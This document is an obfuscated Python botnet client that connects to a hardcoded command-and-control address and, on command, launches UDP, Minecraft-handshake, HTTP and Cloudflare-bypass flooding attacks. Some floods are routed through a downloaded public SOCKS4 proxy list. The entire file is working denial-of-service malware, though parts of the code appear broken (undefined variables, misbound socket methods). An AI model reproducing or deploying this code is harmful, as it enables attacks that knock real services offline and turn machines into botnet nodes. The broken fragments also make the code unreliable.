from urllib.parse import urlparse
tV=False
tA=dict
tK=len
tz=True
tM=EOFError
tv=ord
tj=int
tT=str
tC=bytes
tn=list
tJ=range
tH=Exception
import socket
y=socket.socket
p=socket.recv
import cfscrape
B=cfscrape.create_scraper
import struct
m=struct.pack
import string
a=string.digits
u=string.ascii_letters
i=string.encode
import requests
r=requests.get
import random
q=random._urandom
W=random.choice
import threading
l=threading.Thread
import time
S=time.time
import json
b=json.loads
d=json.dumps
import traceback
import socks
tc=socks.SOCKS4
F=socks.socksocket
t=("149.56.10.115",13484)
c=tV
def G(v,M:tA):
 V=d(M).encode()
 v.G(Y(tK(V))+V)
def E(v)->tA:
 return b(v.recv(O(v)).decode())
def Y(d):
 o=b''
 while tz:
  b=d&0x7F
  d>>=7
  o+=m("B",b|(0x80 if d>0 else 0))
  if d==0:
   break
 return o
def N(socket):
 c=p(1)
 if c==b'':
  raise tM("Unexpected EOF while reading bytes")
 return tv(c)
def O(socket):
 A=0
 K=0
 while tz:
  i=N(socket)
  K|=(i&0x7f)<<A
  A+=7
  if not(i&0x80):
   break
 return K
def h(val:tj):
 return m("!H",val)
def f(M):
 return Y(tK(M))+M
def D(string):
 return f(i())
def X(host:tT,port:tj,prot:tj,next_state:tj)->tC:
 z=b"\x00"
 M=Y(prot)+D(host)+h(port)+Y(next_state)
 return f(z+M)
def P(usr:tT)->tC:
 z=b"\x00"
 M=D(usr)
 return f(z+M)
def o(size:tj):
 return "".join(W(tn(u+a))for _ in tJ(size))
def k(H,proto,until):
 while until>S():
  v=y()
  v.connect((H.split(":")[0],tj(H.split(":")[1])))
  v.G(X(H.split(":")[0],tj(H.split(":")[1]),tj(proto),2))
  v.close()
def s(H,proto,I,until):
 while until>S():
  v=F()
  j=W(I).split(":")
  v.set_proxy(tc,j[0],tj(j[1]))
  v.connect((H.split(":")[0],tj(H.split(":")[1])))
  v.G(X(H.split(":")[0],tj(H.split(":")[1]),tj(proto),2))
  v.close()
def L(T,until):
 T=urlparse(T)
 C=f"GET {'/' if url.path is None else url.path} HTTP/1.1\r\nConnection: keep-alive\r\nHost:{url.netloc}\r\n\r\n"*100
 while until>S():
  v=y()
  v.connect((T.hostname,tj(T.port)))
  v.G(C.encode())
  v.close()
def w(T,I,until):
 T=urlparse(T)
 C=f"GET {'/' if url.path is None else url.path} HTTP/1.1\r\nConnection: keep-alive\r\nHost:{url.netloc}\r\n\r\n"*100
 while until>S():
  v=F()
  j=W(I).split(":")
  v.set_proxy(tc,j[0],tj(j[1]))
  v.connect((T.hostname,tj(T.port)))
  while tz:
   try:
    v.G(C.encode())
   except tH:
    break
  v.close()
def U(H,until):
 while until>S():
  v=y()
  v.sendto(q(60000),(H.split(":")[0],tj(H.split(":")[1])))
def g(T,until):
 n=B()
 while until>S():
  n.get(T)
def Q():
 while tz:
  v=y()
  try:
   v.connect(t)
  except tH as e:
   print(f"Conn failed: {e}\nRetrying...")
   continue
  print("Connected!")
  try:
   while tz:
    M=E(v)
    print(f"Data: {data}")
    if M["packet"]=="keep_alive":
     G(v,{"packet":"keep_alive","data":{"keep_alive_id":M["data"]["keep_alive_id"]}})
    elif M["packet"]=="runAttack":
     J=M["data"]["method"]
     H=M["data"]["target_addr"]
     x=tj(M["data"]["seconds"])
     R=tj(M["data"]["threads"])
     if J=="udp":
      if c:
       print("Can udp attack")
       for _ in tJ(R):
        l(target=U,args=(H,S()+x)).start()
     elif J=="minecraft":
      for _ in tJ(R):
       l(target=k,args=(H,tj(M["data"]["other"][0]),S()+x)).start()
     elif J=="minecraftproxy":
      I=r("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt").text.splitlines()[2:]
      for _ in tJ(R):
       l(target=s,args=(H,tj(M["data"]["other"][0]),I,S()+x)).start()
     elif J=="http-pps":
      for _ in tJ(R):
       l(target=L,args=(H,S()+x)).start()
     elif J=="http-ppsproxy":
      I=r("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt").text.splitlines()[2:]
      for _ in tJ(R):
       l(target=w,args=(H,I,S()+x)).start()
     elif J=="cloudflare":
      for _ in tJ(R):
       l(target=g,args=(H,S()+x)).start()
  except tH:
   print(f"Exception: {traceback.format_exc()}\nReconnecting...")
   continue
Q()
# Created by pyminifier (https://github.com/liftoff/pyminifier)
